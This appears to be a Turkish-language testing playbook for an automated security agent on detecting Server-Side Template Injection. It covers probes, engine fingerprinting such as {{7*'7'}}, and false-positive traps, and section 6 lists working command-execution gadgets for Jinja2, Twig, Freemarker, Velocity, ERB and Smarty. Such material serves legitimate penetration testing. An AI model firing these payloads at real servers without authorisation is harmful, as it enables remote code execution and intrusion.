---
name: vuln-ssti
description: >
  Server-Side Template Injection sınıfı: girdi bir template engine'e (Jinja2/
  Twig/Freemarker/Velocity/ERB/Handlebars/Pug/Smarty) string olarak giriyorsa
  uygulanır. Template ifadesi SUNUCUDA değerlendiriliyor mu onu bulur. Ana karar:
  matematik sunucuda mı hesaplandı, yoksa sadece yansıdı/client'ta mı?
---

# 🧩 SERVER-SIDE TEMPLATE INJECTION — `{{7*7}}` sunucuda 49 oluyorsa açıktır

> **Tek cümle:** Girdiyi template'e veri yerine ifade olarak sokabiliyorsan engine senin için kod çalıştırır; kanıt, matematiğin SUNUCUDA hesaplanmış olması — düz yansıma değil.

İlişkili: [[data-flow-and-mental-model]] [[baseline-and-signal]] [[evidence-discipline]] [[engine-mcp-contract]] [[attacker-mindset-and-persistence]] [[request-economy]] [[vuln-command-injection]]

## 1. NE ZAMAN UYGULANIR (sink/bağlam)
- Girdi sunucu tarafı template'e gidiyorsa: e-posta/bildirim şablonları, "merhaba {{name}}" kişiselleştirme, hata sayfaları, rapor/PDF üretimi, CMS tema alanları, profil/isim alanlarının geri yansıdığı yerler.
- İpuçları: girdinin server-rendered HTML'de aynen göründüğü uçlar; Flask/Django(Jinja2), Symfony/Craft(Twig), Spring(Freemarker), Apache(Velocity), Rails(ERB), Node(Handlebars/Pug), PHP(Smarty) stack'leri.
- SKIP: girdi yalnızca OS komutuna gidiyorsa → [[vuln-command-injection]]. Render server-side değil, tamamen client-side (Angular/Vue) ise SKIP (bkz. §7 client-side template confusion).

## 2. İNSAN MUHAKEMESİ
- Geliştirici `render_template_string("Hi " + name)` gibi kullanıcı girdisini template KAYNAĞINA gömmüş olabilir. Engine `{{...}}`/`${...}`/`#{...}` içini ifade olarak değerlendirir.
- Kaçırılan yer: girdiyi template'e CONTEXT değişkeni olarak vermek yerine string concatenation ile kaynağa katmak; auto-escape'in injection'ı engellemediğini sanmak (escape çıktıyı kaçar, ifade YÜRÜTÜMÜNÜ değil).

## 3. TEŞHİS PROB'U (önce baseline, sonra TEK prob)
- **Baseline:** girdiyi düz metin (`zzz`) gönder, cevapta aynen yansıdığını gör. request_id sakla.
- **Tek prob (sözdizimi ayrımı — bunlar farklı engine ailelerini ayırır):**
  1. `{{7*7}}` gönder → `49` mı, literal mi? (`{{...}}` = Jinja2/Twig/Handlebars/Nunjucks ailesi).
  2. `${7*7}` → `49` mı? (`${...}` = Freemarker/JSP-EL/Thymeleaf/Velocity-bazılı/JS template-literal).
  3. `#{7*7}` → `49` mı? (`#{...}` = Velocity bazı bağlamlar, Ruby string-interp, Spring SpEL).
  4. `<%=7*7%>` → `49` mı? (ERB/EJS/JSP scriptlet).
- **Engine parmak-izi matrisi (math kanıtından sonra motoru sabitle):**
  - `{{7*'7'}}` → **Jinja2** `7777777` (string tekrarı), **Twig** `49` (sayısal çarpım).
  - `{{7*7}}` çalışır + `{{7*'7'}}`=`49` → Twig. `7777777` → Jinja2.
  - `${7*7}`=`49` + `<#assign>` çalışır → **Freemarker**; `${7*7}` + `#set()` → **Velocity**.
  - `{{7*7}}` literal ama `{php}...{/php}` / `{$smarty}` çalışıyor → **Smarty**.
  - `#{7*7}` + Java stack → **SpEL**.

## 4. SİNYAL vs GÜRÜLTÜ
- **Aday (sinyal):** `{{7*7}}` → `49`, ama `{{8*8}}` → `64` (sabit değil, hesaplanıyor); `{{7*'7'}}` engine-spesifik çıktı. Bu, server-side evaluation kanıtıdır.
- **Gürültü (aday DEĞİL):** `{{7*7}}` cevapta aynen `{{7*7}}` olarak yansıyor (literal); `49` sayısının zaten sayfada başka yerde bulunması; client-side framework'ün (`{{ }}` Angular/Vue) tarayıcıda hesaplaması.

## 5. DOĞRULAMA KAPISI (kanıt)
- **Hesaplama kanıtı:** `{{7*7}}`→`49` VE `{{8*8}}`→`64` — iki farklı çarpım iki farklı doğru sonuç verir (tesadüfi `49` elenir). İki request_id.
- **Server-side teyidi:** ham HTTP cevabında (JS çalışmadan) sonuç görünüyorsa server-side; sadece tarayıcıda beliriyorsa client-side → SSTI DEĞİL.
- **Engine teyidi:** `{{7*'7'}}` gibi engine-ayırt edici prob ile motoru sabitle. RCE'ye geçmeden önce evaluation + engine kanıtı şart.

## 6. VARYASYON / BYPASS + RCE GADGET (engine'e göre)
Math-proof + engine sabitlendikten SONRA, o engine'e özgü gadget ile etkiyi yükselt (OS komutu çalıştırmadan önce güvenli okuma probu tercih et):
- **Jinja2 (Python):** sandbox kaçışı `{{config}}` / `{{self.__init__.__globals__}}`; RCE `{{''.__class__.__mro__[1].__subclasses__()...}}` → `os.popen`/`subprocess`. Güvenli prob: `{{config.items()}}` sızıntısı.
- **Twig (PHP):** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` ya da `{{['id']|filter('system')}}` (sürüme göre).
- **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- **Velocity (Java):** `#set($e=...)` ile `Runtime.getRuntime().exec(...)`.
- **ERB (Ruby):** `<%= system("id") %>` / `<%= \`id\` %>`.
- **Smarty (PHP):** `{system('id')}` / `{php}...{/php}` (sürüme göre).
- **Handlebars/Pug (Node):** prototype/helper üzerinden `require('child_process')` gadget'ı.
- **Bağlam/encoding ekseni:** girdi attribute/JS/HTML body neresinde render ediliyor; boşluksuz ifade, yorum enjeksiyonu, filtre zinciri. Sink ekseni: isim/başlık tıkalıysa e-posta/PDF/hata-mesajı yolu.
- Her eksen hipotez; hiçbir aritmetik sunucuda hesaplanmıyorsa "SSTI yok" diye kapat.

## 7. FALSE-POSITIVE TUZAKLARI (zayıf modelin halüsinasyonu)
- **Client-side template confusion (EN SIK ters yön):** Angular/Vue/Handlebars `{{ }}` tarayıcıda da hesaplar. Ham HTTP cevabında `49` YOKSA ama render edilmiş sayfada VARSA bu CLIENT-side'dır → SSTI DEĞİL (belki client-side template injection, ayrı sınıf). DAİMA ham response'a bak.
- **Yansımayı SSTI sanmak:** `{{7*7}}` literal yansıyorsa engine değerlendirmiyor; bu sadece reflected output (belki XSS), SSTI değil.
- **Tesadüfi `49`:** sayfada zaten `49` varsa kanıt değil; `8*8=64` ile teyit et.
- **Yanlış engine gadget'ı:** Jinja gadget'ını Twig'e atıp "çalışmadı, kapalı" deme; önce `{{7*'7'}}` ile motoru sabitle.
- **Evaluation'sız RCE iddiası:** önce hesaplama + engine kanıtı; gadget/RCE bunun üstüne kurulur, atlama.

## 8. DURMA KRİTERİ
- **Kanıtlandı, kapat:** `7*7=49` VE `8*8=64` ham server cevabında + `{{7*'7'}}` engine prob'u tutarlı (+ varsa güvenli gadget okuması).
- **Sinyal yok, kapat:** tüm sözdizimi eksenleri (`{{}}`/`${}`/`#{}`/`<%=%>`) literal yansıdı / hiç hesaplanmadı.
- **Şüpheli, ilerle:** `49` görünüyor ama server-side mı belirsiz → ham response + ikinci çarpım + engine prob'u, sonra karar.

## ÖZET — 5 KURAL
1. `{{7*7}}=49` tek başına yetmez; `8*8=64` ile hesaplandığını sabitle.
2. Daima HAM HTTP cevabına bak — client-side framework'ün `49`'unu SSTI sanma.
3. Sözdizimini ayır (`{{}}`/`${}`/`#{}`/`<%=%>`) ve `{{7*'7'}}` ile motoru parmak-izle.
4. RCE gadget'ı engine'e özgüdür; yanlış engine gadget'ıyla "kapalı" deme.
5. Evaluation + engine kanıtı olmadan RCE/gadget'a geçme; her iddia request_id'li olsun.
